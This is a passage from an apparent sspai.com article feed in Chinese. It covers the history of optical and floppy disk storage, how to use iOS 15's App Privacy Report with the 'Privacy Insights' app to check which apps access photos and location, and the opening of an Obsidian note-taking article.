值，<s>不然用程序算一个圆的面积就能让电脑爆炸</s>。</p>\n<p>加上现代计算机领域（处理、储存、加密、传输……）基本都是基于离散数学的，对无限连续的数据非常不友好。<strong>这个时候我们就需要按不同精度对现实世界连续的数据进行取样了</strong>，这基本就是数字信息的原理。</p>\n<p>如果说上面模拟信息用电压表示是连续曲线，那么数字信息用电压表示就是一段一段的（虽然每段可能非常短，看起来是连续的）：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/76aa42da1258c4f04995582af979672b.png\"></figure><p>简单的理解它们的区别：<strong>如果模拟信息是一条线，那么数字信息就是用很多密集的点尽量完整模拟出这条线。</strong></p>\n<p>举一个我们大家很经常接触的例子，还是音乐。不同于之前设备直接录制声音的连续变化，现代的数字录音机，录制的时候会将声音按照不同的频率采样，比如我们常常听说的 CD 44.1Khz 采样率就是每秒对声音采集 44100 次，记录下每次采集到的信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/3652df4d716dfc7b9cc00f4b3a68c5e8.png\"><figcaption>CD 级音质</figcaption></figure><p>我们听歌的时候，播放器会将这些离散的数据用算法处理成连续的，这样我们就不会听到一卡一卡的歌（其实这就是经常听理科男们说的数模转换了）。采样率还有其他的一些规定采集读取数据的方式合起来就变成了数字信息编码规则，我们经常看到的文件扩展名（.jpg、.mp3、.apk）这些其实就是不同的编码规则，用来规定不同编码规则弄出来的文件怎么放在物理储存设备上，并提供增删查改方法的东西就是我们每天都会用到的文件系统。</p>\n<p>数字信息的优势基本弥补了模拟信号的不足：根本优势是<strong>数字信息把现实世界的各种类型信息统一成一个虚拟层（0/1 二进制），实现一种设备处理储存各种类型的信息</strong>。</p>\n<ul>\n<li>\n<strong>噪声非常少，更加准确</strong>，数字信息保存处理的是经过采样的数据，在信噪比低于一定程度的情况下，可以通过把编码和纠错算法逐个纠错把丢失信息完整还原回来。</li>\n<li>\n<strong>通用保存</strong>，不像是模拟信号一般都要对应的存储介质，数字信号经过转换，可以很方便地储存在任何介质上（包括磁带、黑胶、胶卷甚至打孔纸带）。</li>\n<li>\n<strong>复制转换非常简单</strong>，大家都是数字信息，复制转换自然不用说，利用不同的算法还能让数据变成不同类型，比如视频转图片，也能很方便地加密压缩数据。</li>\n<li>\n<strong>处理更灵活</strong>，数字信息让我们能够更方便的处理它们，比如用 Photoshop 编辑一张图片，实际上就是编辑里面虚拟化的像素信息，在之前需要在胶片上物理修改。</li>\n<li>\n<strong>方便远距离传输</strong><br>等等等等……</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/1a50c6c976ffdddb8589c54b39aeca64.png\"><figcaption>文件系统其实是很复杂的一样东西</figcaption></figure><p>但数字信号也有属于自己的缺点：</p>\n<ul>\n<li>由于需要附加各种复杂的编码信息，数字信号一般对带宽要求更高。</li>\n<li>对硬件的要求更加复杂，我们能够比较无压力的看懂模拟电路，甚至每个人都能自制一个矿石收音机，但数字电路看起来<s>就跟小学三年级学大学英语那样</s>。</li>\n<li>在硬件层上还要经过复杂的系统和算法处理。</li>\n</ul>\n<p>所以现在模拟信号还是在某些领域被广泛使用，根据它们各自优缺点安排最合适的用途。</p>\n<h2>截然不同的命运：软盘与光盘</h2>\n<p>虽然我们现在仍然在广泛使用各种光盘，软盘却已经成为时代的眼泪，但软盘和光盘其实兴起于同一个时代，只不过软盘的命运停步于千禧年，而光盘不断焕发新机直到现在。它们都曾经是最广泛使用的储存设备，但最后的结果却相差甚远，这与它们的原理和特点是离不开关系的。</p>\n<p>上面我们了解完了模拟信息和数字信息的变化，由于数据的本质形式发生了变化，人们需要容量更加大同时体积更加小的储存设备，软盘和光盘就是数字信息时代应运而生的载体。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/bc48c26ff3fac521319b60f39afb30ee.jpg\"><figcaption>光盘和软盘</figcaption></figure><h3>光盘</h3>\n<p>光盘在中国的覆盖可谓是全年龄段的，千禧年之后基本家家户户都会有一台先科的 DVD 机，小孩子的童年是《猫和老鼠》《哆啦 A 梦》等等的正（盗）版 DVD，年轻人把落伍的磁带机换掉，用上了随身 CD 播放器听伍佰周杰伦（千禧年左右 MP3 还是个稀罕玩意儿）。爸妈们常备一套新年歌曲合集和交响乐，全家人还能经常欣赏到充满翻译腔的欧美引进大片，要是家里条件比较好，能有台电脑，那在网络都没有的年代，装软件和驱动都得靠光盘……在信息高速公路直通车前光盘可谓无所不能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/ecb107055ab851152cc138f4bb686fc1.png\"><figcaption>先科的 DVD 机，来源：先科官网</figcaption></figure><p>光盘有很多种类型，常见的几大类就是 CD，DVD 还有我们常听见的 BD 也就是蓝光光盘 Blu-ray Disc。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/1806a0f7cd644b3eff20d7bf8cd9630f.jpg\"><figcaption>音乐光盘</figcaption></figure><h3>光盘的原理</h3>\n<p><strong>写入</strong>：通过厂家设定好的轨道，按固定的速度把表面材料烧掉，烧出不同间隔长度不一的凹点。这些凹点就代表了不同的信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/7d9aed89ff9b77f457eca7d92712859e.png\"><figcaption>放大的光盘表面是这个样子的，图片来源：Youtube@Applied Science</figcaption></figure><p><strong>读取</strong>：传统的是采用近红外线纳米二极管，把红外线射到轨道上，有凹点的地方反射率会不同，从而读取数据。为了提高识别率，没有凸点的地方反射率要尽量得高，所以光盘会添加一个镜面反射层，这也是光盘看起来亮亮的原因，同时由于上面有很多个小凹槽，光线会发生折射与衍射，光盘上便有了那种很独特很漂亮的彩虹纹。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/12/545b1ae7d546f78349951f2b7be61076.gif\"><figcaption>光驱读取的激光头，图片来源：佳能 Canon Global</figcaption></figure><p>这种方式有点像是盲文，通过一个个不同长度的点表示文字，然后盲人用手去触摸感受凹凸从而读出文字。</p>\n<p>市面上还有一种可擦写光盘，可以反复擦写数据，是 20 年代大众经常使用的「移动硬盘」，价格相对来讲很贵。这种光盘的原理是将数据记录的盘片层换成可相变合金，这种金属的特性是在不同功率激光的照射下能够在晶体与非晶体结构之间转换。</p>\n<p>可以用高功率激光，像普通刻录光盘那样照射可擦写光盘，上面金属变成的晶体结构具有良好的反射性，就相当于凹点。而用中等功率激光照射后，就可以把它还原回来。这种光盘由于材料的问题，反射率一般不够一次性光盘高，所以那个时候好的可刻录光盘，价格一般很贵，而且刻录也比较容易翻车（多次刻录后反射性不够，导致无法识别）。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/12/ae925805ba0129e16788e7827aee6361.gif\"><figcaption>可以反复读写的光盘原理，图片来源：佳能 Canon Global</figcaption></figure><h3>蓝光光盘的由来</h3>\n<p>那我们现在常听到的蓝光光盘，说的就是把镜红外线纳米二极管换成波长更短的蓝光，也就是说在盘片上的凹点能烧得更加密集，提升了数据密度，一个盘自然也就能塞下更多的内容。能够比普通 DVD ROM 容量翻倍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/deac9796ebc06d80b39571409620ed0b.png\"><figcaption>蓝光光盘的技术</figcaption></figure><p>光盘的速度和容量一直随着技术发展在提升，从原本 700MB/150KB/s 的容量速度飙升到现在多层蓝光盘（通过不同折射率的透过率来区分不同层盘片）的最高 128G/72MB/s，在商用领域更是有索尼 2015 年推出的 Archival Disc，单盘容量来到了 300GB ，最高速度去到 250MB/s 读 125MB/s 写。</p>\n<p>但随着最近互联网流媒体的发展，<strong>人们对光盘的需求越来越低，光盘的容量速度提升也随之放缓</strong>。比如 2013 年的研究通过新型技术可以将光盘的容量提升到 TB 级，但直到现在仍没有落地产品。</p>\n<p><strong>相关文献</strong>：<br>[1]. CD（Compact Disc）最初的样子可以看一下这篇<a href=\"https://patents.google.com/patent/US3501586A/en\">激光唱片发明者 James T Russell 的专利</a>。</p>\n<p>[2]. 关于光盘的刻录使用维护，可以参考我们国家的<a href=\"https://www.saac.gov.cn/daj/hybz/201903/46c3b37764814570a83b43891fb639e3/files/6be1b6b5ff744dfa9a2d5e0345cadd03.pdf\">《电子档案储存用可录类蓝光光盘（BD-R）技术要求和应用规范》</a>。</p>\n<p>[3]. 关于光盘如何提升用量到 TB 级的技术，可以查看这篇<a href=\"https://www.nature.com/articles/ncomms3061.pdf\">发表在 Nature 的论文</a>。</p>\n<p>[4]. 原理动图来自于佳能科学实验室，完整内容可以查看<a href=\"https://global.canon/en/technology/s_labo/light/003/06.html\">原文</a>。</p>\n<p>[5]. 对大容量光盘感兴趣的朋友可以看看<a href=\"https://pro.sony/s3/cms-static-content/file/49/1237494482649.pdf\">索尼的 Archival Disc 第二代白皮书</a>。</p>\n<p>[6]. 微观图片截取自 Applied Science 的视频，大家可以看看完整版，点击<a href=\"https://www.youtube.com/watch?v=xbo8xi1zgVo\" target=\"_blank\">「Tools and Tips #2 from Applied Science」</a>观看。</p>\n<h3>软盘</h3>\n<p>相比起光盘能给大家的生活带来多姿多彩的应用，大部分对软盘的印象应该是比较正式的，感觉就是用来存软件驱动和工作资料啥的。我猜是因为没有什么公司做家用的软盘读取器，然后那个时候大家电脑用途还是比较正经的，所以软盘就变成了比较专业的一种东西。但大部分人对它的主要印象还有另外一个：特别容易坏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/7d756a962d26a8405030fd9c0489c9e9.jpg\"></figure><p>像是前面提到的所有设备一样，软盘也有很多个尺寸和型号，甚至早期各家的软盘虽然长得一样，但是并不能互相读取（比如苹果和其他家的），我们下面提到的基本都是以大家常见的 3.5 寸软盘为主。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/c46216f8c3cf8ed41a81ab8ffefd0d48.jpg\"><figcaption>SONY 家的 3.5 寸软盘</figcaption></figure><h3>软盘工作的原理</h3>\n<p>我们可以把软盘看成一个，<strong>用着磁带的材料但却有着机械硬盘工作原理的东西</strong>。它的身上已经出现了扇区和磁道的概念，甚至可以把原理无缝放到机械硬盘上，虽然它比机械硬盘转得慢，并且装到一个软软的塑料盒子里（所以叫软盘）。</p>\n<p>为了解决磁带不能随机读取的缺点，软盘用上了磁带相同的材料却做成了一个圆片，然后被分成了下面这样的同心圆环（磁道）而被切成很多小块的扇区，扇区是由软件定义的，不同品牌都不一样，<strong>扇区是软盘保存读取的基本单位</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/e7327b64a5d82ee59df1b517850e1d7d.png\"><figcaption>软盘的分区</figcaption></figure><p><strong>保存/读取数据</strong>：（某些软盘第一次用之前必须格式化）计算机发出保存或写入数据命令时，软驱（软盘读取器）会让磁盘转起来，同时用电机让读写磁头移动到对应磁道正上方，等盘片转到要写入的扇区，和读写磁头同一块地方的擦除磁头会把这个扇区的数据清除掉（会清除比写入的扇区更大的区域，防止周围的数据干扰空白扇区的磁性），然后写磁头通过不同的电流永久改变底下区域的磁性来写入数据。读取的时候则是读磁头感应底下区域的磁性产生不同的电流，转换成数据返回给计算机，同时会发出指令让磁盘停止旋转。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/182473df7330e4fef35971c828e6e789.png\"><figcaption>磁头读写原理，图片来源：MIT</figcaption></figure><h3>软盘为什么容易坏</h3>\n<p>软盘容易坏几乎是用过软盘的小伙伴达成的共识，这主要是因为<strong>盘片直接暴露在空气中并且和外壳有接触</strong>，而且读取的时候需要磁头直接接触盘片，就跟磁带那样。虽然软盘里面有一块软绒材质的布来减少盘片和外壳的摩擦，同时还具有清理作用，防止摩擦产生的磁颗粒干扰扇区或者粘到磁头上，但盘片依然会被不断磨损，上面的磁性材料全都磨掉就没办法读写数据了。加上软盘的壳子比较软，平时携带时容易导致盘片形变，加剧旋转时的摩擦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/ee97efd9a01ed237bf26592869b77a43.jpg\"><figcaption>我的手甚至能直接摸到盘片</figcaption></figure><p>这也是机械硬盘要做成全封闭不可拆卸，并且盘片悬浮的原因。其实软盘如果仅仅日常数据也没有大家想象中那么脆弱，毕竟磁带和它类似但很耐用，我自己存着的软盘现在大多数还能够读取。一般都是携带过程中损坏，还有就是后期厂家制造质量下降（最早出产的 3.5 寸软盘质量都很好）。</p>\n<p>软盘的容量最初是几十到几百 KB，到淘汰前索尼的软盘已经能做到 1~3 MB 了，还有更特殊的几百 MB 的软盘。读写速度方面，软盘一般在十几到几十 KB/s 左右，不过每次都要等盘片转到满速才行。</p>\n<p><strong>相关文献</strong>：</p>\n<p>[1]. 3.5 寸软盘和软驱的结构可以参考<a href=\"https://patents.google.com/patent/US3668658A/en\">软盘的专利</a>和<a href=\"https://patents.google.com/patent/US5629819A/en\">软驱的专利</a>。</p>\n<p>软盘和光盘它们俩出现截然不同命运的根本原因，就是在于介质的鲁棒性。光盘使用非接触的方式读取，不会因为使用时间增长而对盘片本身产生磨损，同时密度不高的光盘即时盘片被划损也能通过纠错算法补全数据。也就是说日常大众在使用存储设备的时候，并不会像实验室那样小心翼翼的保存，只有真正持久耐用的设备才会成为大众日常使用的选择。</p>\n<h2>总结</h2>\n<p>结束了软盘和光盘的介绍，再往下就是我们熟知的设备：机械硬盘、固态硬盘、内存、内存卡、U 盘……的时代，本章的内容已经基本结束了。本章节中，我带大家了解了历史上著名的储存设备，回忆了一下不同年代的情怀（还有历史的眼泪），也让大家了解到人类为了保存自己的信息做出了多大的努力，当然历史上还有很多很多不同类型的储存设备因为篇幅原因没有办法提到，感兴趣的小伙伴可以去网上搜一下储存设备发展的历史时间轴，然后找找相关专利和论文。</p>\n<p>热身完毕之后，下一章就开始介绍大家熟悉的设备，第一个当然是现在还在大范围使用的机械硬盘了。下一章我会介绍机械硬盘是怎么来的，它的原理是什么，常见参数代表的意义，以及接下来几章的选购与使用指南。</p>\n<blockquote><p>提示：大家有什么问题都可以在评论区留言，我会尽力回答大家的问题。</p></blockquote>\n","link":"https://sspai.com/post/68711"},{"title":"App+1 | 谁看了你的 iOS 相册？这款直观、免费的小工具可以告诉你：隐私洞见","date":"2021-10-09 08:00:05","description":"\n<p>10 月 8 日，一条有关于微信的热搜 <a href=\"https://s.weibo.com/weibo?q=#%E5%BE%AE%E4%BF%A1%E5%9C%A8%E5%90%8E%E5%8F%B0%E5%8F%8D%E5%A4%8D%E8%AF%BB%E5%8F%96%E7%94%A8%E6%88%B7%E7%9B%B8%E5%86%8C%23&amp;from=default\" target=\"_blank\">#微信在后台反复读取用户相册#</a> 引发了不小的话题，一位用户利用 iOS / iPadOS 15 自带的「记录 App 活动」和应用「隐私洞见」发现微信会在未主动使用的情况下后台扫描用户的相册。这也让不少人担心自己的照片会被用于跟踪，甚至有可能会被意外泄露。</p>\n<p>虽然微信也于当晚通过新浪科技作出了 <a href=\"https://weibo.com/1642634100/KBOwdDbEE?filter=hot&amp;root_comment_id=4690124157224352&amp;type=comment\" target=\"_blank\">回应</a>，但我们也可以在自己的 iDevice 上查看已安装的 App 是如何使用自己数据的，也就是通过之前提到的 iOS / iPadOS 15 自带的「记录 App 活动」功能进行查阅，但它目前有一个小问题——不够直观。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5gk7vdb34teit0pnc9g.jpeg\"><figcaption>Apple 官方还未上线的 App 隐私活动查看功能，来自 <a href=\"https://www.apple.com/newsroom/2021/06/apple-advances-its-privacy-leadership-with-ios-15-ipados-15-macos-monterey-and-watchos-8/\" target=\"_blank\">Apple Newsroom</a></figcaption></figure><p>虽然，WWDC 上提到「记录 App 活动」这个功能在稍后的 iOS / iPadOS 版本中将提供可视化图表，但是截至 iOS / iPadOS 15.1 beta 3 此功能仍未上线。这个功能目前已经可以导出纯粹的 json 格式，但 json 不利于普通用户进行数据分析，所以我们仍需借助「隐私洞见」才能进行可视化分析。</p>\n<h2>打开和存储「记录 App 活动」</h2>\n<p>在运行 iOS 或者 iPadOS 15 的 iOS 设备和 iPadOS 设备上，前往 <code>设置 &gt; 隐私 &gt; 记录 App 活动</code>，并打开「记录 App 活动」右侧的开关。此时，你的设备会立即开始记录各个 app 的活动，你可以随时选择存储，设备会记录近 7 日内的各类隐私数据的 app 活动，包括相册、位置、麦克风、摄像头等等访问数据，还有这些 app 访问的网络 IP 或者域名。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5gk7vlb34teit0pnca0.png\"></figure><p>打开后，下方会出现「存储 App 活动」的按钮。点击这个按钮，iOS 会将目前已经记录的活动保存成一个文件，并弹出分享菜单（这个过程可能会花上一点时间）。</p>\n<h2>把隐私访问数据导入「隐私洞见」</h2>\n<p>安装「隐私洞见」之后，在<code>设置 &gt; 隐私 &gt; 记录 App 活动</code>中点击「存储 App 活动」，此时在弹出的共享菜单中选择「导入到隐私洞见」，在弹出的窗口中点击「导入」。在这个窗口中，还可以添加一些标注，可以酌情添加。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5gk7vtb34teh3cl97cg.png\"></figure><p>点击「导入」之后，所有数据都会导入这个 app。「隐私洞见」也会自动打开，显示提示「已导入」。此时点击「查看」按钮，即可查看本次存储的隐私活动数据。</p>\n<p>要注意的是，目前 iOS 只能记录 7 天的 app 活动，因此，为了能够持续获得隐私报告，用户需要每 7 天将 App 活动报告导入到「隐私洞见」一次。</p>\n<h2>查看具体 app 的隐私访问数据</h2>\n<p>由于在 iOS 隐私报告中并不会出现 app 的具体名称，而是以标识符的形式呈现，「隐私洞见」通常会调用 iTunes API 访问 App Store 自动识别这些标识符；但如果没有自动识别，我们也可以手动对这些标识符进行识别，从而能够更清晰地看到这些 app 的真实名称。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5gk805b34teh5fkvv0g.png\"></figure><p>以「Picsew」为例，我们点击 <code>com.sugarmo.ScrollClip</code> 后，点击「尝试识别」按钮，然后点击「我知道此应用的国家/地区」，在列表中选择你购买（获取）这个 app 的商店所在的国家 / 地区（在这里是「中国大陆」），也可以下拉进行搜索。此后，重新回到 app 列表，就可以看到这款 app 的图标、名称与开发者。</p>\n<p>在 1.3 版本的「隐私洞见」中，你还可以设置这款 app 默认读取的 App Store 国家或地区，分为「首选」和「备选」，最大程度保证列表中的每一款 app 都可以自动识别。相关设置在 <code>隐私洞见 &gt; 设置 &gt; iTunes API</code> 中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5gk80db34teh0gc1vj0.png\"></figure><p>每个 app 的数据页都会显示一个总览，包括橙色的数字（即访问具体隐私项目，比如相册、摄像头、位置、麦克风等等的总次数）以及蓝色的数字（即访问网络活动的总条数）。点击下方「记录」一栏中的「访问记录」和「网络活动」可以分别查看两项记录的具体数据。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5gk80lb34teh3cl97d0.png\"></figure><h3>隐私数据访问记录</h3>\n<p>在「访问记录」中，我们可以见到某款 app 在什么时间做了什么事情。如果点进去，还可以看到它访问这项数据的具体情况，包括开始、结束与持续的时间；此外，还可以点击右上角的「All」对数据进行筛选。</p>\n<p>以「支付宝」为例，2021 年 10 月 8 日早上 8:19，它调用了我的摄像头，持续时间为 1 秒。当时我正在扫码开单车，所以这项活动完全在我的意料之内。</p>\n<p><strong>相比之下，「微信」的活动则有点出人意料。</strong>目前我 iPhone 上的微信处于登出的状态，平常也不会打开使用，不过，我还是可以看到，2021 年 10 月 8 日下午 9:39，微信曾请求了我的定位，时间长达 10s；同一时间还访问了我的相册，时间长达 44s。</p>\n<p>微信 10 月 8 日通过新浪科技作出了 <a href=\"https://weibo.com/search?containerid=100103type%3D1%26q%3D%23%E5%BE%AE%E4%BF%A1%E5%9B%9E%E5%BA%94%E7%94%A8%E6%88%B7%E7%9B%B8%E5%86%8C%E9%97%AE%E9%A2%98%23%26t%3D3\" target=\"_blank\">回应</a>，相关话题曾冲到微博热搜榜第 2 名。回应指出，「当用户授权微信可以读取『系统相册权限』的前提后，为便于用户在微信聊天中按『+』时可以快速发图，微信使用了该系统能力，使用户发送图片体验更快速流畅。上述行为均仅在手机本地完成，最新版本中将取消对该系统能力的使用，优化快速发图功能。」</p>\n<p>然而，<strong>我对此还是持怀疑态度</strong>：我以为微信快速发图这个功能，是我点击「+」号的时候才对我的相册做读取操作；其实逻辑上来说，微信也并不需要在用户相册每次更新的时候读取数据。退一万步来说，就算相册更新的时候微信需要读取数据，它也不需要读取用户的当前位置数据；更不需要在用户已经登出的情况下读取任何数据。</p>\n<p>至于该功能如何「优化」，还要待微信官方推出更新后进行测试才能知晓。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5gk80tb34teh5fkvv10.png\"></figure><h3>网络活动数据</h3>\n<p>在「网络活动」中，可以看到某款 app 在什么时间访问了哪些 IP 地址或者域名。以「飞书」为例，它在 2021 年 10 月 8 日下午 1:16 访问了某网站 4, 254 次。该网站是飞书的官方网站，这一活动很可能是完全正常的。</p>\n<h2>iOS 的权限管理建议</h2>\n<p>数据本身是冰冷的，它还是需要用户的解读。有些时候，app 访问隐私数据与网站是正常之举，我们无需担心；但是有些时候，它们的行为明显不太正常，这才需要使用类似「隐私洞见」的应用程序配合 iOS 的权限记录来进行分析。针对某些 app 的不太正常的隐私数据访问活动，你可以采取的行动包括：</p>\n<ul>\n<li>\n<strong>关闭（或者部分关闭）app 的隐私数据访问权限。</strong>前往 <code>设置 &gt; 隐私</code>，可见到许多隐私项目，可以一一点进去进行自定义设置，可以选择打开或者关闭某些 app 的开关。特别地，针对照片访问，我们可以选择让某些 app 只访问相册中你选择的图片与视频。</li>\n<li>\n<strong>关闭 app 后台刷新。</strong>在 <code>设置 &gt; 通用 &gt; App 后台刷新</code>中，可以选择关闭部分 app 的后台刷新。这样，在你清理掉这个 app 的后台之后（即在 App 切换器中上划退出这个 app），它就会停止后台活动，即使有权限也无法访问你的数据。关闭后台刷新也<strong>不会影响</strong>即时聊天软件的消息推送。</li>\n<li>\n<strong>善用系统级别的分享菜单。</strong>如果你还是担心某些 app 读取照片、文件等个人数据，还可以直接关闭它们访问这些数据的权限。如需发送照片或者文件，可以在「照片」或者「文件」app 中使用系统级的分享菜单，把想要的图片或者文件发送到这些 app 中。这将创建这个文件的一份拷贝，它只用于你所分享到的 app，而不会泄露其他的照片和文件，也（得益于 APFS 文件系统的特性）不会占用额外的设备存储空间。</li>\n<li>\n<strong>卸载（而不是删除）app。</strong>iOS 提供卸载（而不是删除）app 的功能，可以在保留 app 用户数据的同时删除 app 本体的代码与文件，在需要时可以随时从 App Store 下载。在 <code>设置 &gt; 通用 &gt; iPhone 存储空间</code>（也可能是 <code>iPad 存储空间</code>或者 <code>iPod 存储空间</code>）中，当 app 列表加载完成后，点击进入 app 空间使用详情页面，点击「卸载 App」（蓝色文字）。这样一来，app 也无法在后台访问任何隐私数据。</li>\n</ul>\n<h2>写在最后</h2>\n<p>iOS 丰富的隐私访问权选项为用户提供了比较全面的自定义权力，而 iOS 15 加入的这项新功能，更是为用户提供了透明而充实的隐私访问数据。这让用户对于各款 app 的活动情况了如指掌，也因此能够更好地通过各种手段，最大限度地防止某些流氓 app 侵犯隐私。</p>\n<p>因此，我们很高兴看到 iOS 继 Android 之后，为用户提供了这一了解个人隐私数据情况的渠道，期待这一功能得到进一步的完善，以至于无需借助第三方工具进行数据统计与分析；也希望「科技向善」不仅仅是一句口号 —— 而是要各大科技与互联网公司拿出实际行动与具体措施，捍卫个人数据隐私这项用户的基本权利。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/app-privacy-insights/id1575583991\" target=\"_blank\">App Store</a> 下载「隐私洞见」，应用免费，且无内购。</p>\n<span class=\"ss-application\" app-id=\"16226\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，了解更多有趣的应用 🚀</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69202"},{"title":"玩转 Obsidian：以知识内化为目标，做好阅读和记录","date":"2021-10-09 06:31:07","description":"\n<h3><strong>专栏文章 首页推荐</strong></h3>\n<p>少数派专栏是 Matrix 社区中的一部分，我们会不定期挑选专栏中最优质的文章，展示来自用户和开发者的真实体验和观点。<a href=\"https://sspai.com/post/65959\">点此</a> 了解什么是少数派专栏，<a href=\"https://sspai.com/columns\">点击</a> 查看全部少数派专栏。</p>\n<p>本文来自 <a href=\"https://sspai.com/column/263\" target=\"_blank\">知识管理之术</a> 专栏，和大家探讨「知识管理」的各种层级和方法，其目的为启发思考与共同探索并找到适合自己的「知识管理之术」。关注专栏，随时掌握最新资讯。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>「玩转 Obsidian」系列会持续更新使用 Obsidian 进行知识管理的文章，如果你对此系列感兴趣可以关注少数派的专栏「<a href=\"https://sspai.com/my/column/263/post\">知识管理之术</a>」。</p>\n<p>在上一篇《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》文章中分析了个人在知识管理上经历的三个阶段：</p>\n<ul>\n<li>阶段 1：以收集为目的的「知识管理」</li>\n<li>阶段 2：以整理为目的的「知识管理」</li>\n<li>阶段 3：以「知识循环」为目的的「知识管理」</li>\n</ul>\n<p>显然目前正处在「阶段 3」：<strong>知识管理要以「知识循环」为主要目的</strong>。<a href=\"https://sspai.com/post/67339\">文中总结道</a>：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/958284977128991e716841d2558d3586.png\"><figcaption>《<a href=\"https://sspai.com/post/67339\">为什么推荐使用 Obsidian 做知识管理</a>》</figcaption></figure><p>所以本篇打算跟大家聊聊「知识循环」中的前两个环节「阅读」和「记录」。</p>\n<h2>阅读：在「立即文化」流行的当下如何找到优秀的内容</h2>\n<p>当今社会「快速消费」已是社会共识，每个人都没有时间或没有精力去掌握更多的内容，仿佛谁能够快速将「精髓」喂给消费者谁就能胜出，不可否认这也有可取之处，但是总觉得这样是不正常的，在去年的 <a href=\"https://twitter.com/xianzheshijian/status/1337713062975995905?s=20\">一篇推文</a> 中探讨过这个问题：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/2af66c07bb3f37d9fd7ffcccbf96c1e7.png\"><figcaption><a href=\"https://twitter.com/xianzheshijian/status/1337713062975995905?s=20\">一篇推文</a></figcaption></figure><p>这里我们不讨论对与错，个人认为「立即文化」是要解决的问题，面对这个问题我的方案就是建立自己的「筛选机制」：</p>\n<p>1. 在 Telegram 主动关注感兴趣的频道，并 mute 掉不重要的频道，减少信息干扰。</p>\n<ul><li>Telegram 上有许多优秀推送频道，但是也有许多闲聊频道，我的做法是只对重要的几个频道开放通知，其他频道需要看但不那么重要就 mute 掉。</li></ul>\n<p>2. 使用 <a href=\"https://inoreader.com/\" target=\"_blank\">Inoreader</a> 等类似支持「规则筛选」的 RSS 订阅服务。</p>\n<ul>\n<li>RSS 订阅的优势是你可以自己掌控资源。虽然高质量的频道已经不多。</li>\n<li>Inoreader 支持按照给定的「条件」进行筛选 RSS 新闻源，这样会屏蔽掉一些自己不感兴趣的内容，一个示例如图：</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/4f59951ab253d01f8cab7eaf71aa114c.png\"></figure><p> </p>\n<p>3. 推荐使用支持「邮件订阅」的会员通讯录，例如 <a href=\"https://macstories.net/\" target=\"_blank\">MacStories</a>、<a href=\"https://member.yitianshijie.net/\" target=\"_blank\">一天世界</a> 等</p>\n<ul>\n<li>通常「会员通讯录」会在固定的周期（每周或每月）将精心准备的内容推送到邮箱。</li>\n<li>订阅相当于付费阅读，可以获得相对高质量内容。</li>\n<li>PS：虽然「一天世界」是「IT 公论」的续集，但是我更喜欢早期「IT 公论」的通讯内容。</li>\n</ul>\n<p>4. 推荐使用支持「会员计划」的资讯网站，例如 <a href=\"https://sspai.com/prime\" target=\"_blank\">少数派会员</a>、<a href=\"https://medium.com/\" target=\"_blank\">Medium</a> 会员等，同样付费可以获得相对高质量内容。</p>\n<ul>\n<li>少数派相信我的读者大多知道，从最早的 Power+ 到现在的「少数派会员」，比较符合他们的 slogan 「高效工作，品质生活」。</li>\n<li>Medium 会员是我长期订阅付费的服务，每年 50 美金虽然不便宜，但是无论是技术方案还是行业资讯都可以找到很多高质量的第一手资料。在 Medium 上可以订阅各种你感兴趣的话题和作者，并能够随时收到他们的更新。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/5871cf8bab5ac3acec9e047713240a17.png\"></figure><p>5. 